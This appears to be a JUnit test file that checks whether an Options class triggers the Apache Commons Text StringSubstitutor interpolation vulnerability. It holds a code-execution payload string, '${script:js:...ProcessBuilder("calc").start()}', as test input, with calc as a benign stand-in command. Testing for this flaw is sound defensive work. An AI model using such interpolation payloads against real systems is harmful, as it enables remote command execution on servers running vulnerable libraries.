import org.junit.Test;
import static org.junit.Assert.assertTrue;

public class OptionsTest {

    @Test
    public void testVulnerabilityTriggered() {
        // Test input data
        String input = "${script:js:new java.lang.ProcessBuilder(\"calc\").start()}";

        // Intercept the vulnerable method call
        MethodCallInterceptor.interceptor(
            org.apache.commons.text.StringSubstitutor.class,
            "replace",
            new Object[]{input}
        );

        try {
            // Create an Options object and call the function under test
            Options options = new Options();
            options.addDynamicProperty("key", input);
        } catch (Exception e) {
            // Exception caught, do nothing
        }

        // Assert that the vulnerability was successfully triggered
        assertTrue(MethodCallInterceptor.isTriggered());
assertTrue(MethodCallInterceptor.isConditionMet());
    }
}
